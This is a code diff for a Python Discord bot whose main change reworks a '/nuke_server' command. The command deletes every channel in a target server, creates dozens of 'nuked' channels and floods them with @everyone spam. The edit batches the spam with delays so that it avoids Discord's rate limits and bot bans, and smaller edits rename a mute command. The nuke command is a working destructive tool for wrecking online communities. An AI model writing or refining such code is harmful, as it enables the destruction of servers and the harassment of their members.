@@ -28,11 +28,11 @@ GUILD_ID = os.getenv("GUILD_ID") # e.g. 1476039725319061648
 DATA_FILE = "bot_data.json"
 
 # Nuke command configuration
-NUKE_KEY = "i want toonuke"  # Change this to your secret confirmation key
+NUKE_KEY = "nuke8048"  # Change this to your secret confirmation key
 CHANNEL_BASE_NAME = "nuked"
 SPAM_MSG = "@everyone @here nuked lol"
 CHANNEL_COUNT = 50
-SPAM_COUNT = 500
+SPAM_COUNT = 400
 
 if not os.path.exists(DATA_FILE):
     with open(DATA_FILE, "w", encoding="utf-8") as f:
@@ -90,7 +90,7 @@ async def admin_server_autocomplete(
 # ────────────────────────────────────────────────
 @tree.command(
     name="nuke_server",
-    description="EXTREME - Instant nuke (fast delete + spam)"
+    description="DANGER - Nuke any server you're admin in (key required)"
 )
 @app_commands.default_permissions(administrator=True)
 @app_commands.describe(
@@ -124,63 +124,91 @@ async def nuke_server_cmd(
             "You need Administrator permission in that server.", ephemeral=True)
         return
 
-    # Defer right away — gives us the full window
+    # Defer immediately – gives 15 minutes to finish
     await interaction.response.defer(ephemeral=False)
 
-    await interaction.followup.send(
-        f"☢️ **INSTANT NUKE STARTED** on {target_guild.name} ({guild_id})\n"
-        "Deleting everything → creating spam channels → flooding...",
-        ephemeral=False
-    )
-
-    deleted = 0
-    created = []
-    sent = 0
-
     try:
-        # Phase 1: Delete channels as fast as possible
-        delete_tasks = [ch.delete(reason=f"instant nuke by {interaction.user}") for ch in list(target_guild.channels)]
-        results = await asyncio.gather(*delete_tasks, return_exceptions=True)
-        deleted = sum(1 for r in results if not isinstance(r, Exception))
+        await interaction.followup.send(
+            f"☢️ **NUKE STARTED** on {target_guild.name} ({guild_id})\n"
+            "Deleting channels → Creating spam channels → Flooding...",
+            ephemeral=False
+        )
 
-        await interaction.followup.send(f"Deleted **{deleted}** channels instantly", ephemeral=False)
+        # Phase 1: Delete channels (fast parallel)
+        deleted = 0
+        delete_tasks = [ch.delete(reason=f"nuke by {interaction.user}") for ch in list(target_guild.channels)]
+        delete_results = await asyncio.gather(*delete_tasks, return_exceptions=True)
+        deleted = sum(1 for r in delete_results if not isinstance(r, Exception))
+        await interaction.followup.send(f"Deleted **{deleted}** channels", ephemeral=False)
 
-        # Phase 2: Create channels fast
+        # Phase 2: Create channels (fast parallel)
+        created = []
         create_tasks = []
         for i in range(CHANNEL_COUNT):
             name = CHANNEL_BASE_NAME if i == 0 else f"{CHANNEL_BASE_NAME}-{i+1}"
             create_tasks.append(target_guild.create_text_channel(name))
-        
-        created_results = await asyncio.gather(*create_tasks, return_exceptions=True)
-        created = [ch for ch in created_results if isinstance(ch, discord.TextChannel)]
 
+        create_results = await asyncio.gather(*create_tasks, return_exceptions=True)
+        created = [ch for ch in create_results if isinstance(ch, discord.TextChannel)]
         await interaction.followup.send(f"Created **{len(created)}** channels", ephemeral=False)
 
-        # Phase 3: Spam as fast as Discord allows (no sleep)
+        # Phase 3: Spam in safe batches
         if created:
-            spam_tasks = []
-            for _ in range(SPAM_COUNT):
-                ch = random.choice(created)
-                spam_tasks.append(ch.send(SPAM_MSG))
+            sent = 0
             
-            spam_results = await asyncio.gather(*spam_tasks, return_exceptions=True)
-            sent = sum(1 for r in spam_results if not isinstance(r, Exception))
+            global SPAM_COUNT  # ← THIS FIXES the "cannot access local variable" error
+            
+            # ─── SAFETY CAP ───
+            MAX_SAFE_SPAM = 250  # ← Change this to whatever max you want (e.g. 200, 300, 150)
+            if SPAM_COUNT > MAX_SAFE_SPAM:
+                await interaction.followup.send(
+                    f"⚠️ Safety cap activated: Limiting to **{MAX_SAFE_SPAM}** messages to avoid Discord banning the bot.",
+                    ephemeral=False
+                )
+                SPAM_COUNT = MAX_SAFE_SPAM
+            # ──────────────────
 
-            await interaction.followup.send(f"Flooded **{sent}** messages instantly", ephemeral=False)
+            batch_size = 15
+            delay_between_batches = 3.0  # seconds – helps avoid instant 429
 
-        # Final message
+            for start in range(0, SPAM_COUNT, batch_size):
+                batch = []
+                for _ in range(min(batch_size, SPAM_COUNT - start)):
+                    ch = random.choice(created)
+                    batch.append(ch.send(SPAM_MSG))
+                    sent += 1
+
+                if batch:
+                    await asyncio.gather(*batch, return_exceptions=True)
+
+                # Delay between batches
+                if start + batch_size < SPAM_COUNT:
+                    await asyncio.sleep(delay_between_batches)
+
+                # Progress update
+                try:
+                    await interaction.followup.send(
+                        f"Spam progress: **{sent}/{SPAM_COUNT}** messages sent",
+                        ephemeral=False
+                    )
+                except:
+                    pass  # continue even if update fails
+
+            await interaction.followup.send(f"Spam finished – **{sent}** messages sent", ephemeral=False)
+
+        # Final success message
         await interaction.followup.send(
-            f"**Instant nuke finished** on {target_guild.name}\n"
+            f"**Nuke completed** on {target_guild.name}\n"
             f"Deleted: {deleted} | Created: {len(created)} | Spam: {sent}",
             ephemeral=True
         )
 
     except Exception as e:
-        print(f"Nuke crashed: {e}")
+        print(f"Nuke error: {str(e)}")
         try:
-            await interaction.followup.send(f"Critical crash: {str(e)}", ephemeral=True)
+            await interaction.followup.send(f"Critical error during nuke: {str(e)}", ephemeral=True)
         except:
-            print("Couldn't even send crash message")
+            print("Final followup failed – nuke may have partially completed")
 # ────────────────────────────────────────────────
 # Rest of your original code (unchanged from here)
 # ────────────────────────────────────────────────
@@ -1039,7 +1067,7 @@ async def kick(interaction: discord.Interaction, member: discord.Member, reason:
     except discord.Forbidden:
         await interaction.response.send_message("Missing permissions to kick.", ephemeral=True)
 
-@tree.command(name="mute", description="Mutes a user (Timeout + Role) with an embed response")
+@tree.command(name="timeout", description="Mutes a user (Timeout + Role) with an embed response")
 @app_commands.default_permissions(moderate_members=True)
 @app_commands.describe(time="Format: 1d, 10h, 30m, 15s (e.g., 1h30m)", reason="Reason for the mute")
 async def mute(interaction: discord.Interaction, member: discord.Member, time: str, reason: str = "No reason provided"):
@@ -1387,7 +1415,7 @@ async def help_command(interaction: discord.Interaction):
     ), inline=False)
     embed.add_field(name="Pings", value="`/pingstart` `/pingstop`", inline=False)
     embed.add_field(name="Fun & Utility", value=(
-        "`/say` `/jackbomb` `/8ball` `/coinflip` `/dice` `/joke` "
+        "`/say` `/8ball` `/coinflip` `/dice` `/joke` "
         "`/airoast` `/aipickup` `/poll` `/set_starboard` `/rr`"
     ), inline=False)
     embed.set_footer(text="JackBot • March 2026")
